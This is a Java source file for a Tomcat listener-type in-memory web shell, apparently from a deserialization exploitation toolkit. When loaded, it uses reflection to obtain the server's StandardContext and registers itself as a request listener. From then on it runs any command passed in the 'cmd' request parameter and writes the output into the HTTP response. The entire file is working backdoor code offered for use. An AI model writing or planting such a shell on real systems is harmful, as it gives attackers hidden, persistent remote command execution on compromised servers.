package xyz.eki.marshalexp.memshell.Tomcat.Listener;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

/**
 * Tomcat Listener 型内存马
 */
public class TomcatListenerMemshell implements ServletRequestListener {

    private final String cmdParamName = "cmd";
    static {
        try {
            // 获取 standardContext
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

            StandardContext       standardContext;

            try {
                standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            } catch (Exception ignored) {
                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                field.setAccessible(true);
                Object root   = field.get(webappClassLoaderBase);
                Field  field2 = root.getClass().getDeclaredField("context");
                field2.setAccessible(true);

                standardContext = (StandardContext) field2.get(root);
            }

            TomcatListenerMemshell listener = new TomcatListenerMemshell();
            standardContext.addApplicationEventListener(listener);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
            Field         field         = requestFacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request  request  = (Request) field.get(requestFacade);
            Response response = request.getResponse();
            requestInitializedHandle(request, response);
        } catch (Exception ignore) {
        }
    }

    public void requestInitializedHandle(HttpServletRequest request, HttpServletResponse response) throws IOException {
        System.out.println(
                "TomcatShellInject listener.....................................................................");
        String cmd;
        if ((cmd = request.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            response.getOutputStream().write(stringBuilder.toString().getBytes());
            response.getOutputStream().flush();
            response.getOutputStream().close();
            return;
        }
    }
}